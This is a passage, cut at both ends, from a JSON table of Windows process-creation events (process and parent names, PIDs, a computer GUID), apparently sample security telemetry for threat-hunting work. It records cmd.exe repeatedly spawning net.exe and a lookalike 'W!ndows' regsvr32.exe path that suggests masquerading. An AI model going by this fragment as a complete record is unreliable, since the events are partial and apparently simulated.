d.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\W!ndows\\\\System32\\\\regsvr32.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\",\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\"],\"NewProcessName_par\":[\"NaN\",\"NaN\",\"NaN\",\"NaN\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"NaN\",\"NaN\",\"NaN\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"NaN\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"NaN\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"NaN\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\"],\"PID\":[\"PID: 0x167c (5756)\",\"PID: 0x25b0 (9648)\",\"PID: 0x750 (1872)\",\"PID: 0x20ec (8428)\",\"PID: 0x464 (1124)\",\"PID: 0x1328 (4904)\",\"PID: 0x1d60 (7520)\",\"PID: 0x1de0 (7648)\",\"PID: 0x26a8 (9896)\",\"PID: 0x1ffc (8188)\",\"PID: 0x34c (844)\",\"PID: 0x1b7c (7036)\",\"PID: 0x1184 (4484)\",\"PID: 0x13d4 (5076)\",\"PID: 0x17ec (6124)\",\"PID: 0x16b4 (5812)\",\"PID: 0x1ec (492)\",\"PID: 0x1e60 (7776)\",\"PID: 0x121c (4636)\",\"PID: 0x2704 (9988)\",\"PID: 0x261c (9756)\",\"PID: 0x248c (9356)\",\"PID: 0x1454 (5204)\",\"PID: 0xf4c (3916)\",\"PID: 0x2614 (9748)\",\"PID: 0x6c (108)\",\"PID: 0x1528 (5416)\",\"PID: 0x1d98 (7576)\",\"PID: 0x2618 (9752)\",\"PID: 0x2498 (9368)\",\"PID: 0x1058 (4184)\",\"PID: 0x27fc (10236)\",\"PID: 0x27ec (10220)\",\"PID: 0x2294 (8852)\",\"PID: 0x19dc (6620)\",\"PID: 0x2680 (9856)\",\"PID: 0x18bc (6332)\",\"PID: 0xebc (3772)\",\"PID: 0x126c (4716)\",\"PID: 0x1fb0 (8112)\",\"PID: 0x11e0 (4576)\",\"PID: 0x13e8 (5096)\",\"PID: 0x27c4 (10180)\",\"PID: 0x1894 (6292)\",\"PID: 0x2f8 (760)\",\"PID: 0x1850 (6224)\",\"PID: 0x1280 (4736)\",\"PID: 0x2790 (10128)\",\"PID: 0xf0c (3852)\",\"PID: 0x1a0c (6668)\",\"PID: 0x176c (5996)\",\"PID: 0x2754 (10068)\",\"PID: 0x265c (9820)\",\"PID: 0x1e4c (7756)\",\"PID: 0x2450 (9296)\",\"PID: 0x19d0 (6608)\",\"PID: 0x25d8 (9688)\",\"PID: 0x474 (1140)\",\"PID: 0x2244 (8772)\",\"PID: 0x7f4 (2036)\",\"PID: 0x2044 (8260)\",\"PID: 0x5b4 (1460)\",\"PID: 0x1c08 (7176)\",\"PID: 0x314 (788)\",\"PID: 0xbac (2988)\",\"PID: 0x113c (4412)\",\"PID: 0x27e8 (10216)\",\"PID: 0x7e0 (2016)\",\"PID: 0x2514 (9492)\",\"PID: 0xf68 (3944)\",\"PID: 0x161c (5660)\",\"PID: 0x1c64 (7268)\",\"PID: 0x1bf0 (7152)\",\"PID: 0x3c (60)\",\"PID: 0xac8 (2760)\",\"PID: 0x2698 (9880)\",\"PID: 0x20c4 (8388)\",\"PID: 0x40 (64)\",\"PID: 0x271c (10012)\",\"PID: 0x1ab4 (6836)\",\"PID: 0x1638 (5688)\",\"PID: 0x13a8 (5032)\",\"PID: 0x10a4 (4260)\",\"PID: 0x1110 (4368)\",\"PID: 0x20dc (8412)\",\"PID: 0xaa4 (2724)\",\"PID: 0x1148 (4424)\",\"PID: 0x660 (1632)\",\"PID: 0x2604 (9732)\",\"PID: 0x2664 (9828)\",\"PID: 0xf14 (3860)\",\"PID: 0x1108 (4360)\",\"PID: 0x178c (6028)\",\"PID: 0x1ef8 (7928)\",\"PID: 0x24a8 (9384)\",\"PID: 0xaf0 (2800)\",\"PID: 0xa24 (2596)\",\"PID: 0x1b04 (6916)\",\"PID: 0x1754 (5972)\",\"PID: 0x25a8 (9640)\",\"PID: 0x153c (5436)\",\"PID: 0x13b0 (5040)\",\"PID: 0x1388 (5000)\",\"PID: 0x24c0 (9408)\",\"PID: 0x1960 (6496)\",\"PID: 0x219c (8604)\",\"PID: 0x1bf4 (7156)\",\"PID: 0x1e74 (7796)\",\"PID: 0x13e0 (5088)\",\"PID: 0x1440 (5184)\",\"PID: 0x1fd0 (8144)\",\"PID: 0x60c (1548)\",\"PID: 0x2670 (9840)\",\"PID: 0x5e0 (1504)\",\"PID: 0x1e78 (7800)\",\"PID: 0xe3c (3644)\",\"PID: 0x2214 (8724)\",\"PID: 0x26cc (9932)\",\"PID: 0x1404 (5124)\",\"PID: 0x192c (6444)\",\"PID: 0x1990 (6544)\",\"PID: 0xeb0 (3760)\",\"PID: 0x11cc (4556)\",\"PID: 0x1780 (6016)\"],\"ParentProcessName\":[\"NaN\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\"],\"ProcessId\":[\"NaN\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x20ec\",\"0x20ec\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x1ec\",\"0x26a8\",\"0x26a8\",\"0x2704\",\"0x26a8\",\"0x248c\",\"0x26a8\",\"0xf4c\",\"0x26a8\",\"0x26a8\",\"0x1528\",\"0x26a8\",\"0x2618\",\"0x26a8\",\"0x26a8\",\"0x27fc\",\"0x26a8\",\"0x2294\",\"0x26a8\",\"0x2680\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x167c\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0xf0c\",\"0x11e0\",\"0x11e0\",\"0x2754\",\"0x11e0\",\"0x1e4c\",\"0x11e0\",\"0x11e0\",\"0x25d8\",\"0x11e0\",\"0x2244\",\"0x11e0\",\"0x11e0\",\"0x5b4\",\"0x11e0\",\"0x314\",\"0x11e0\",\"0x113c\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x161c\",\"0x11e0\",\"0x1bf0\",\"0x11e0\",\"0xac8\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x1110\",\"0x11e0\",\"0x11e0\",\"0x1148\",\"0x11e0\",\"0x2604\",\"0x11e0\",\"0xf14\",\"0x11e0\",\"0x11e0\",\"0x1ef8\",\"0x11e0\",\"0xaf0\",\"0x11e0\",\"0x11e0\",\"0x1754\",\"0x11e0\",\"0x153c\",\"0x11e0\",\"0x1388\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x1e74\",\"0x11e0\",\"0x1440\",\"0x11e0\",\"0x60c\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x167c\",\"0x192c\",\"0x167c\",\"0xeb0\",\"0xeb0\"],\"ProcessId_par\":[\"NaN\",\"NaN\",\"NaN\",\"NaN\",\"0x167c\",\"0x167c\",\"NaN\",\"NaN\",\"NaN\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x26a8\",\"0x167c\",\"0x167c\",\"0x167c\",\"NaN\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x11e0\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x167c\",\"NaN\",\"0x167c\",\"NaN\",\"0x167c\",\"0x167c\"],\"Row\":[124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,109,108,107,106,105,104,103,102,101,100,99,98,97,96,95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,64,63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,39,38,37,36,35,34,33,32,31,30,29,28,27,26,25,24,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1],\"SourceComputerId\":[\"NaN\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-ebeafb54254e\",\"73a015ec-e2b6-4bf7-b353-eb